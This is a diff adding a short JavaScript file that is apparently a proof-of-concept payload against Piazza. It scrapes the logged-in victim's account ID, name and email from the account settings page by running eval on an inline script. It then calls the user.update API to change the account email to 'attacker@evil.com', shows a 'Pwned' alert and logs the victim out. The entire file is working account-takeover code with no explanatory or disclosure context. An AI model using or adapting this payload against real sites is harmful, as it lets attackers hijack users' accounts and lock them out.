@@ -1,0 +1,42 @@
+function getUserInfo(callback) {
+        var request = new XMLHttpRequest();
+        request.onload = function () {
+                var script = this.responseXML.getElementsByTagName("script")[18]
+                                .text;
+                eval(script);
+                var userInfo = {
+                        "aid": USER_STATUS.aid,
+                        "email": USER_STATUS.result.email,
+                        "name": USER_STATUS.result.name
+                };
+                return callback(userInfo);
+        };
+        request.open("GET", "https://piazza.com/account_settings", true);
+        request.responseType = "document";
+        request.send();
+};
+function changeUserInfo(aid, name, email, callback) {
+        var request = new XMLHttpRequest();
+        request.onload = callback;
+        request.open("POST", "https://piazza.com/logic/api?method=user.update&aid=" +
+                        aid, true);
+        var jsonData = {
+                "method": "user.update",
+                "params": {
+                        "email": email,
+                        "name": name
+                }
+        };
+        request.send(JSON.stringify(jsonData));
+};
+
+function logout() {
+        parent.location = "https://piazza.com/logout";
+};
+
+getUserInfo(function (info) {
+        changeUserInfo(info.aid, info.name, "attacker@evil.com", function () {
+                alert("Pwned");
+                logout();
+        });
+});
